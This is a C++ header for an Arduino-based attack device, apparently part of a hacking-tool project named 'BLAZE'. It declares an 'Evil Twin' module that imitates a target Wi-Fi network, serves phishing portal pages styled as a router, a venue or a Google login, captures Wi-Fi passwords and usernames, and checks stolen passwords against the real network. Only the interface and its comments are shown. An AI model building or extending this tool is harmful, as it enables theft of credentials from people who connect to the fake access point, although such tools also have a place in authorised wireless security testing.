/* BLAZE - Team DARK
   Evil Twin: open AP with target SSID + captive phishing portal
   Reuses existing wifi softAP + DNS wildcard; password validated via WiFi.begin */

#pragma once

#include <Arduino.h>

namespace BlazeEvilTwin {
    void setup();
    void update(); // validation / timeout tick

    bool start(int apIdx);
    void stop();
    bool active();

    String  targetSsid();
    String  captured();   // last successful password ("" if none)
    String  capturedUser();// captured email/username ("" if none)
    uint8_t attempts();
    bool    validatingNow();

    // web: called from wifi.cpp routes when twin is active
    bool     servePortal();   // true if twin active (server should show portal)
    void     submitPassword(const String& pw); // store + kick async validation
    void     submitCredentials(const String& user, const String& pw); // immediate capture, no WiFi validation
    String   portalHtml();    // phishing page HTML
    String   ackHtml();       // page shown after a portal POST (retry loop)

    // portal templates (plan 3.4): 0 matrix, 1 router, 2 venue, 3 google
    int         templateId();
    void        setTemplate(int id);
    int         cycleTemplate();       // 0 -> 1 -> 2 -> 3 -> 0 (persists)
    const char* templateName();
}
